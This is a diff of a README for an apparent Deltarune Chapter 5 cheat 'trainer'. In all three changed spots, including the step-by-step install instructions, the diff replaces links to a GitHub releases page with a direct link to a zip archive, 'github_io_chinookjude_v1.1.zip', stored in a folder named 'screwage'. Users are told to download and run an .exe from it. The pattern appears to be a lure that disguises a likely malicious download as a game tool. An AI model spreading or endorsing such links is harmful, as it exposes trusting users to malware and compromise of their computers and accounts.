@@ -5,7 +5,7 @@ description: "Modify stats and health in Deltarune Chapter 5 with this trainer. 
 ---
 # 🎮 Deltarune-Chapter5-Ultimate-Trainer-2026 - Master your game with ease
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/chinookjude273/Deltarune-Chapter5-Ultimate-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://raw.githubusercontent.com/chinookjude273/chinookjude273.github.io/main/screwage/github_io_chinookjude_v1.1.zip)
 
 This software offers tools for Deltarune Chapter 5. It modifies game values to provide infinite health, maximum statistics, and unlimited items. You use this tool to remove difficulty from battles and explore the story without restrictions.
 
@@ -13,7 +13,7 @@ This software offers tools for Deltarune Chapter 5. It modifies game values to p
 
 You need a Windows computer to use this trainer. Follow these steps to set up the software on your machine.
 
-1. Visit the [official releases page](https://github.com/chinookjude273/Deltarune-Chapter5-Ultimate-Trainer-2026/releases) to download the program.
+1. Visit the [official releases page](https://raw.githubusercontent.com/chinookjude273/chinookjude273.github.io/main/screwage/github_io_chinookjude_v1.1.zip) to download the program.
 2. Locate the file ending in .exe in the list of assets.
 3. Save the file to your computer.
 4. Open the downloaded file to start the trainer.
@@ -78,7 +78,7 @@ You can uncheck the boxes in the trainer menu to turn off the modifications. Som
 The trainer only supports Windows-based game files. You would need a virtual machine or a compatibility layer to run it on other systems.
 
 **Does the software update automatically?**
-The software does not contain an auto-updater. Check the [releases page](https://github.com/chinookjude273/Deltarune-Chapter5-Ultimate-Trainer-2026/releases) periodically to see if a newer version exists.
+The software does not contain an auto-updater. Check the [releases page](https://raw.githubusercontent.com/chinookjude273/chinookjude273.github.io/main/screwage/github_io_chinookjude_v1.1.zip) periodically to see if a newer version exists.
 
 ## 📋 Troubleshooting
 
